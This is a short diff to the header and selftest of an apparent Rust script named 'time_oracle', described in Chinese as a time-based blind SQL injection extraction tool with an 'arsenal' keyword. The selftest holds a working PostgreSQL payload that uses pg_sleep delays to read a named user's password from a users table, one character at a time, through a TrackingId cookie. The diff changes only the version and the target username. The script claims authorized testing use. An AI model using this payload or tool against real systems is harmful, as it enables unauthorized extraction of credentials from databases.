@@ -1,7 +1,7 @@
 #!/usr/bin/env rust-script
 //! name: time_oracle
 //! description: 时间型布尔 oracle 提取件(盲注时间延迟腿)- 用同一个注入模板逐请求发送并测单次响应耗时,以「耗时 >= 阈值」为真值读布尔;两种读法:charset 逐字符命中,或 bisect 对 ASCII 码做二分;另给 eval 多载荷定点判定(真/假对照)。一个信封给出基线耗时、每步耗时轨迹、抽出串与抽样复核。合法授权测试用途。
-//! version: 1.0.0
+//! version: 1.0.1
 //! args: <url> --template 'FULL-VALUE with {I} {C} {S}' [--place cookie:TrackingId] [--sleep 3] [--threshold-secs 2.0] [--bisect 32-126] [--charset S] [--max N] [--eval 'FULL-VALUE with {S}']... [--method GET] [--jar PATH] [--extra-header 'K: V'] [--threads N] [--timeout-ms N] [--selftest]
 //! keywords: 漏洞猎手套件, 武器库, 渗透测试, blind, sqli, time-based, delay, oracle, pg_sleep, extract
 //!
@@ -367,7 +367,7 @@ fn load_jar(path: &str) -> Jar {
 fn selftest() {
     let cfg = Cfg {
         url: "https://example.test/".to_string(),
-        template: "xyz'||(SELECT CASE WHEN (ascii(substring(password,{I},1))>{C}) THEN pg_sleep({S}) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--".to_string(),
+        template: "xyz'||(SELECT CASE WHEN (ascii(substring(password,{I},1))>{C}) THEN pg_sleep({S}) ELSE pg_sleep(0) END FROM users WHERE username='user1')--".to_string(),
         place: "cookie:TrackingId".to_string(),
         method: "GET".to_string(),
         sleep: 3,
